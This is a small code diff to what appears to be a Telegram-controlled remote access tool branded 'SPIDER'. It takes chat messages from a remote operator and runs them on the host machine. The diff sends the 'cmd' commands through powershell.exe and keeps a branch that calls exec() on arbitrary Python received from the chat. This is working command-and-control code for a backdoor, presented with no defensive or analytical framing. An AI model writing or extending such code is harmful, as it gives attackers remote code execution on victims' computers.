@@ -137,8 +137,8 @@ def echo_all(message):
                 bot.send_message(message.chat.id, "NUMBERS MODE", reply_markup=num_keyboard)
             elif "cmd " in b:
                 bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("cmd")[1][1:] + " ```",parse_mode="Markdown")
-                end = os.popen(b.split("cmd")[1][1:]).read()
-            elif "py " in b:
+                end = os.popen("powershell.exe "+b.split("cmd")[1][1:]).read()
+            elif "pye " in b:
                 bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
                 exec(b.split("py")[1][1:])
             elif "CHECK CONNECTION" == b or "/check" == b:
